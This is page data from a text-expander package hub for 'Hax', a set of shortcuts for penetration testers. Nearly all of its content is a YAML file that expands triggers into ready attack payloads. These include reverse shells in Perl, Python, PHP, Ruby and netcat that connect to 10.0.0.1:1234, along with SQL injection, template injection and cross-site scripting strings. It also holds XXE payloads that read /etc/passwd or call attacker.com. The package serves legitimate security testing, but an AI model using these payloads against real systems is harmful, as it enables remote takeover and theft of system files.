{"pageProps":{"packageRepo":{"package":{"id":"hax-0.1.0","name":"hax","author":"Nick Aliferopoulos","description":"Penetration testing utilities and replacements","title":"Hax","version":"0.1.0","tags":["hax","hack","hacking","penetration","sqli","xss","shell","ssti","xxe"],"archive_url":"https://github.com/espanso/hub/releases/latest/download/hax-0.1.0.zip","archive_sha256_url":"https://github.com/espanso/hub/releases/latest/download/hax-0.1.0-sha256.txt"},"manifest":{"name":"hax","title":"Hax","description":"Penetration testing utilities and replacements","version":"0.1.0","author":"Nick Aliferopoulos","tags":["hax","hack","hacking","penetration","sqli","xss","shell","ssti","xxe"],"homepage":{"_tag":"None"}},"readme":"# Hax - A collection of shortcuts for hackers/penetration testers\n\nAll the payloads included in `Hax` originate from the following sources, which I would like to thank:\n- https://github.com/swisskyrepo/PayloadsAllTheThings\n- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet","packageYml":[{"name":"package.yml","content":"matches:\n  # Reverse Shells\n  - trigger: \":rev-perl\"\n    replace: \"perl -e 'use Socket;$i=\\\"10.0.0.1\\\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};'\"\n  - trigger: \":rev-python\"\n    replace: \"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.0.0.1\\\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\"\n  - trigger: \":rev-php\"\n    replace: \"php -r '$sock=fsockopen(\\\"10.0.0.1\\\",1234);exec(\\\"/bin/sh -i <&3 >&3 2>&3\\\");'\"\n  - trigger: \":rev-ruby\"\n    replace: \"ruby -rsocket -e'f=TCPSocket.open(\\\"10.0.0.1\\\",1234).to_i;exec sprintf(\\\"/bin/sh -i <&%d >&%d 2>&%d\\\",f,f,f)'\"\n  - trigger: \":rev-nc\"\n    replace: \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f\"\n\n  # SQL Injection Payloads\n  - trigger: \":sqli-poly\"\n    replace: \"SLEEP(1) /*' or SLEEP(1) or '\\\" or SLEEP(1) or \\\"*/\"\n\n  # Server-side Template Injection Payloads\n  - trigger: \":ssti-asp\"\n    replace: \"@(1+2)\"\n  - trigger: \":ssti-el\"\n    replace: \"${1+1}\"\n  - trigger: \":ssti-el-alt\"\n    replace: \"#{1+1}\"\n  - trigger: \":ssti-groovy\"\n    replace: \"${\\\"http://www.google.com\\\".toURL().text}\"\n  - trigger: \":ssti-groovy-alt\"\n    replace: \"${new URL(\\\"http://www.google.com\\\").getText()}\"\n  - trigger: \":ssti-jinja\"\n    replace: \"{{4*4}}[[5*5]]\"\n  - trigger: \":ssti-ruby-file\"\n    replace: \"<%= File.open('/etc/passwd').read %>\"\n  - trigger: \":ssti-ruby-dir\"\n    replace: \"<%= Dir.entries('/') %>\"\n  - trigger: \":ssti-smarty\"\n    replace: \"{$smarty.version}\"\n  - trigger: \":ssti-twig\"\n    replace: \"{{dump(app)}}\"\n  - trigger: \":ssti-velocity\"\n    replace: \"#set($str=$class.inspect(\\\"java.lang.String\\\").type)\"\n\n  # Cross-site Scripting Payloads\n  - trigger: \":xss-basic\"\n    replace: \"<script>confirm`1`</script>\"\n  - trigger: \":xss-img\"\n    replace: \"<img src=a onerror=confirm`1`/>\"\n  - trigger: \":xss-dom\"\n    replace: \"#\\\"><img src=/ onerror=alert(1)>\"\n  - trigger: \":xss-markdown\"\n    replace: \"[a](javascript:prompt(1))\"\n  - trigger: \":xss-poly\"\n    replace: \"\\\" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//\"\n\n  # External XML Entity Injection Payloads\n  - trigger: \":xxe-file\"\n    replace: \"<?xml version=\\\"1.0\\\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>\"\n  - trigger: \":xxe-http\"\n    replace: \"<?xml version=\\\"1.0\\\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com'>]><root>&test;</root>\""}],"license":{"_tag":"None"},"serializedReadme":{"compiledSource":"\"use strict\";\nconst {Fragment: _Fragment, jsx: _jsx, jsxs: _jsxs} = arguments[0];\nconst {useMDXComponents: _provideComponents} = arguments[0];\nfunction _createMdxContent(props) {\n  const _components = {\n    a: \"a\",\n    code: \"code\",\n    h1: \"h1\",\n    li: \"li\",\n    p: \"p\",\n    ul: \"ul\",\n    ..._provideComponents(),\n    ...props.components\n  };\n  return _jsxs(_Fragment, {\n    children: [_jsx(_components.h1, {\n      children: \"Hax - A collection of shortcuts for hackers/penetration testers\"\n    }), \"\\n\", _jsxs(_components.p, {\n      children: [\"All the payloads included in \", _jsx(_components.code, {\n        children: \"Hax\"\n      }), \" originate from the following sources, which I would like to thank:\"]\n    }), \"\\n\", _jsxs(_components.ul, {\n      children: [\"\\n\", _jsx(_components.li, {\n        children: _jsx(_components.a, {\n          href: \"https://github.com/swisskyrepo/PayloadsAllTheThings\",\n          children: \"https://github.com/swisskyrepo/PayloadsAllTheThings\"\n        })\n      }), \"\\n\", _jsx(_components.li, {\n        children: _jsx(_components.a, {\n          href: \"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\",\n          children: \"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\"\n        })\n      }), \"\\n\"]\n    })]\n  });\n}\nfunction MDXContent(props = {}) {\n  const {wrapper: MDXLayout} = {\n    ..._provideComponents(),\n    ...props.components\n  };\n  return MDXLayout ? _jsx(MDXLayout, {\n    ...props,\n    children: _jsx(_createMdxContent, {\n      ...props\n    })\n  }) : _createMdxContent(props);\n}\nreturn {\n  default: MDXContent\n};\n","frontmatter":{},"scope":{}}},"versions":["0.1.0"]},"__N_SSG":true}